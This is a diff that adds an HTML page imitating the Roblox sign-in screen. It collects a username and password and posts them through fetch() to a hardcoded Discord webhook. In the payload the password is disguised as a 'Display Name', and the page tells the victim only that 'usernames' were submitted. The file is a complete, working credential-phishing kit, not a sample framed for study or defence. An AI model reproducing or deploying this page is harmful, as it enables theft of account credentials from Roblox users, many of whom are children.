@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Roblox Sign In</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: #e5e5e5;
+      background-image: url('https://upload.wikimedia.org/wikipedia/commons/1/1b/Roblox_Logo_2022.svg');
+      background-repeat: no-repeat;
+      background-position: center 30px;
+      background-size: 200px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      padding-top: 150px;
+    }
+
+    .login-container {
+      background: white;
+      padding: 2.5rem;
+      border-radius: 12px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+    }
+
+    h2 {
+      margin-bottom: 1.5rem;
+      color: #cc0000;
+      font-weight: 700;
+    }
+
+    .input-group {
+      margin-bottom: 1.2rem;
+      text-align: left;
+    }
+
+    .input-group label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: 500;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 0.75rem;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 1rem;
+    }
+
+    .login-button {
+      width: 100%;
+      padding: 0.75rem;
+      background-color: #cc0000;
+      border: none;
+      color: white;
+      font-size: 1rem;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .login-button:hover {
+      background-color: #a10000;
+    }
+
+    .message {
+      margin-top: 1rem;
+      font-size: 0.9rem;
+    }
+
+    .success {
+      color: green;
+    }
+
+    .error {
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <h2>Roblox Sign In</h2>
+    <form onsubmit="handleLogin(event)">
+      <div class="input-group">
+        <label for="username1">Roblox Username</label>
+        <input type="text" id="username1" required />
+      </div>
+      <div class="input-group">
+        <label for="username2">passsword</label>
+        <input type="text" id="username2" required />
+      </div>
+      <button class="login-button" type="submit">Log In</button>
+      <div id="message" class="message"></div>
+    </form>
+  </div>
+
+  <script>
+    function handleLogin(event) {
+      event.preventDefault();
+
+      const username1 = document.getElementById("username1").value.trim();
+      const username2 = document.getElementById("username2").value.trim();
+      const message = document.getElementById("message");
+
+      if (!username1 || !username2) {
+        message.textContent = "Please fill in both fields.";
+        message.className = "message error";
+        return;
+      }
+
+      // Replace YOUR_WEBHOOK_URL_HERE with your actual Discord webhook URL
+      const webhookURL = "https://discord.com/api/webhooks/1377409611002286201/6YX_wL9saCPuJlvGY0RWuQ9Jz1iUUol1Y5svDN5Ugwqk4osgz1-ztV8vvG6bmZf9NHD5";
+
+      const payload = {
+        content: `🎮 Roblox Login Attempt:\n**Username:** ${username1}\n**Display Name:** ${username2}`
+      };
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      }).then(response => {
+        if (response.ok) {
+          message.textContent = "Usernames submitted successfully.";
+          message.className = "message success";
+          document.getElementById("username1").value = "";
+          document.getElementById("username2").value = "";
+        } else {
+          message.textContent = "Failed to send data.";
+          message.className = "message error";
+        }
+      }).catch(error => {
+        message.textContent = "Network error.";
+        message.className = "message error";
+        console.error("Webhook error:", error);
+      });
+    }
+  </script>
+</body>
+</html>
